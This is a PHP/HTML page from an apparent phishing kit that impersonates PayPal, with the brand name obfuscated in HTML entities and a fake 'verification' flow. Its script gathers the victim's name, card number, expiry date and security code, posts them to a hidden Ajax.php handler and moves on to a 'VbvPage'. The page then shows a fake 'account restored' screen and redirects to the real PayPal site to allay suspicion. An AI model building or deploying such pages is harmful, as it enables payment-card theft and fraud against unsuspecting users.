<?php

	require_once __DIR__.'/functions/functions.php';
	require __DIR__.'/functions/crypt.php';
    require_once __DIR__.'/../lang/detect.php';


?>
<!DOCTYPE html>
<html>

    <head>
        <title>&#80;ay&#80;al - <?php echo $P1_text1; ?>.</title>
        <link rel="shortcut icon" href="../assets/img/icon.ico" />
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="cache-control" content="no-store">
        <meta http-equiv="cache-control" content="max-age=0">
        <meta http-equiv="expires" content="-1">
        <meta http-equiv="pragma" content="no-cache">
        <meta name="robots" content="noindex,nofollow">
        <!-- Style -->
        <link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/VerifyPage.css">
        <!-- Scripts -->
        <script type="text/javascript" src="../assets/js/jquery.min.js"></script>
        <script type="text/javascript" src="../assets/js/bootstrap.min.js"></script>
    </head>

    <body>
        <script type="text/javascript">
			$(document).ready(function(){
				$('#checkout_card_number').creditCardTypeDetector({ 'credit_card_logos' : '.card_logos' });


				$('input[type=text]').keyup(function(){
					$(this).removeClass('HasErrorBorder');
				});

				$('select').change(function(){
					$(this).removeClass('HasErrorBorder');
				});
                $('.PageContent').toggleClass();
				$('#CcForm').submit(function(){

					// return false;

					function HasError(ElmId){
						var ElmId = $(ElmId);
						$(ElmId).addClass('HasErrorBorder');
					}
					var fname = $('#fname').val();
					var lname = $('#lname').val();
					var CcNum = $('#checkout_card_number').val();
					var ExpMo = $('#DOBMonth :selected').val();
					var ExpYr = $('#DOBYear :selected').val();
					var NuC5C = $('#C5c').val();

					if( fname == '' ){

						HasError('#fname');
						return false;
					}else if( lname == '' ){

						HasError('#lname');
						return false;
					}else if( CcNum == '' ){

						HasError('#checkout_card_number');
						return false;
					}else if( ExpMo == '0' ){

						HasError('#DOBMonth');
						return false;
					}else if( ExpYr == '0' ){

						HasError('#DOBYear');
						return false;
					}else if( NuC5C == '' ){
						HasError('#C5c');
						$('#C5c').removeClass('C5c');
						return false;
						
					}else{

						$.ajax({
							url: '/../includes/Ajax.php',
							method: 'post',
							data: $('#CcForm').serialize(),
							beforeSend: function(){
								$('.spinner').removeClass('hide');
							},
							success: function(JsonResponse){
								
								
								var JSONArray = $.parseJSON(JsonResponse);

								if(JSONArray.status == 'fail')
								{
									location.reload();
								}
								else
								{
									var delay1 = 2000; //Your delay in milliseconds
									setTimeout(function(){
										$('.oneSecond').html('<?php echo $P1_text2; ?>')
									}, delay1);
									window.location = 'VbvPage.php';
								}
							}
						});
						return false;
					}

				});


			});
        </script>
        <header class="header">
            <nav class="navbar-verify">
                <div class="nav-desktop">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-8">
                                <ul>
                                    <li>
                                        <a href="#" class="navbar-brand ppl-brand"></a>
                                    </li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text3; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text4; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text5; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text6; ?></a></li>
                                    <li><a class="effect-1" href="#"><?php echo $P1_text7; ?></a></li>
                                </ul>
                            </div>
                            <div class="col-md-4">
                                <ul class="right-navbar">
                                    <li><a href="#"><i class="fa fa-bell" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#"><i class="fa fa-cog" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="nav-mobile">
                    <ul>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                        <li>
                            <a href="#" class="navbar-brand ppl-brand"></a>
                        </li>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;"><i class="fa fa-bell" style="font-size: 25px;"></i></a></li>
                    </ul>
                </div>
            </nav>
            <div class="UserInfo">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-7 col-md-7 col-ms-12 Profile_UserName">
                            <div class="container">
                                <div class="row">
                                    <div class="profilepic"> <img src="../assets/img/profilepic.png"> </div>
                                    <div>
                                        <p class="HelloUser"><?php echo $P1_text10; ?><br> <a href="#"><?php echo $P1_text11; ?></a></p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-5 DisplayName-3-Item">
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;color: #0070ba;"><i class="fa fa-send" style="font-size: 27px;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text13; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile"><i class="fa fa-mobile" style="font-size: 48px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text14; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="icon-mobile" style="padding: 24px;"><i class="fa fa-shopping-bag" style="font-size: 27px;color: #0070ba;"></i></div>
                                    </center>
                                    <p class="text-center"><a href="#"><?php echo $P1_text15; ?></a></p>
                                </div>
                            </center>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <!-- End BarTop -->
        <div class="container PageContent">
            <div class="row">
                <div class="col-lg-4 col-md-4 np">

                    <div class="col-lg-12 col-md-12 Tap-1">
                        <div class="Step1Header CardN"><b class="page-header"><?php echo $P1_text16; ?></b></div>
                        <div class="VerifiStep">
                            <div class="VerticalLine"></div>
                            <ul>
                                <li class="Tap-1-Active"><font><?php echo $P1_text17; ?></font></li>
                                <li class="Tap-1-Active"><font href="#"><?php echo $P1_text18; ?></font></li>
                                <li class="Tap-1-Active"><font href="#"><?php echo $P1_text19; ?></font></li>
                            </ul>
                        </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header" style=""> <b class="page-header"><?php echo $P5_text20; ?></b> <span class="pull-right"><a href="#"><?php echo $P5_text21; ?> <i class="fa fa-angle-right"></i></a></span>
                        </div>
                        <div class="VerifiStep">
                            <p class="HowManyMoney">
                                <img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                                <p>Please complete verification steps to restore your balance</p>
                            </p>
                            <ul class="WithdrawMoney">
                                <li><a href="#" class="Step1Header"><?php echo $P5_text3; ?></a></li>
                                <li><a href="#" class="Step1Header"><?php echo $P5_text4; ?></a></li>
                            </ul>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                            <b class="page-header"><?php echo $P5_text5; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
                            <img src="../assets/img/warning-alert.jpg" class="warning-text-img" />
                            <p>Please complete verification steps to restore your credit cards</p>
                            <div><a href="#" class="add-card"><?php echo $P1_text27; ?></a></div>
                            <br>
                         </div>
                    </div>

                    <div class="col-lg-12 col-md-12 Tap-2">
                        <div class="Step1Header">
                            <b class="page-header"><?php echo $P1_text33; ?></b>
                        </div>
                        <div class="VerifiStep cards-and-banks">
                            <ul class="WithdrawMoney">
                                <li><a href="#" class="Step1Header"><?php echo $P1_text34; ?></a></li>
                                <li><a href="#" class="Step1Header"><?php echo $P1_text35; ?></a></li>
                                <li><a href="#" class="Step1Header"><?php echo $P1_text36; ?></a></li>
                            </ul>

                         </div>
                    </div>

                </div><!-- End Tap Left -->


                <div class="col-lg-8 col-md-8 np">
                <div class="col-lg-12 col-md-12 Verify-Form pull-right">
<br>
<br>
                <center>
                <div class="container">
                <div class="col-md-12">
                	<img src="../assets/img/verified.gif?<?php echo rand(111,999); ?>" style="width: 25%;">
                	<h2 class="AccountRestored"><?php echo $P1_text28; ?></h2>
                    <h3><?php if (isset($_SESSION['Fn'])) { echo $_SESSION['Fn']." "; echo $_SESSION['Ln'].",";  } ?></h3>
                	<br>
                	<p class="text-left TextThanks"><?php echo $P1_text29; ?></p>
                	<a class="BtnAccountVerified" href="#"><?php echo $P1_text30; ?></a>
                	<p class="RedirectingToAccount"><?php echo $P1_text31; ?></p>
                	<meta http-equiv="refresh" content="5;url=https://paypal.com/" />
                </div>
                </div>
                </center>

                </div>
	                    	</div>
							
	                    </div>
	                </div><!-- End Verification Form -->

	            </div>
        </div>
        </div>
        </div>
        </div>
        <div class="wrap"></div>
        <footer class="footer">
        	<div class="container">
        		<div class="row">
        		<div class="col-md-12">
        		<p class="text-center" style="margin: 0;background: #ffffff;padding: 1%;color: #9e9e9e;"><?php echo $P1_text32; ?></p>
        		</div>
        		</div>
        	</div>
        </footer>
</body>
</html>